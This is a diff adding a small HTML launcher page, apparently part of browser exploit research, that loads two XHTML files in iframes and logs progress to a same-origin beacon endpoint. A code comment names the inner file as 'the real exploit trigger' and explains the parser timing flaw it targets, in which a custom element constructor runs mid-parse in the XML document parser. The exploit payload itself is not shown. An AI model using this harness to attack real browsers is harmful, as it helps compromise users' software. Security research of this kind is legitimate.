@@ -1,0 +1,33 @@
+<!doctype html><html><head><title>V412</title></head><body>
+<script>
+var BQ = 0;
+function B(t) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/beacon/V412-' + t + '?t=' + Date.now() + '&q=' + (BQ++), false);
+    x.send('');
+  } catch(e) {}
+}
+B('LAUNCHER-BOOT');
+
+// Load p412-inner.xhtml in iframe -- this is the real exploit trigger.
+// The inner XHTML defines a CE via <script>, then has <stolen-elem> tags
+// AFTER the script. XMLDocumentParser processes them with CE registered,
+// running the constructor during startElementNs before parserAppendChild.
+var iframe = document.createElement('iframe');
+iframe.style.cssText = 'width:100%;height:400px;border:1px solid red';
+iframe.src = 'p412-inner.xhtml';
+iframe.onload = function() { B('INNER-LOADED'); };
+iframe.onerror = function() { B('INNER-ERROR'); };
+document.body.appendChild(iframe);
+B('IFRAME-APPENDED');
+
+// Also load the broader test probe
+var iframe2 = document.createElement('iframe');
+iframe2.style.cssText = 'width:100%;height:400px;border:1px solid blue';
+iframe2.src = 'p412-xmlce-direct.xhtml';
+iframe2.onload = function() { B('DIRECT-LOADED'); };
+document.body.appendChild(iframe2);
+B('LAUNCHER-DONE');
+</script>
+</body></html>
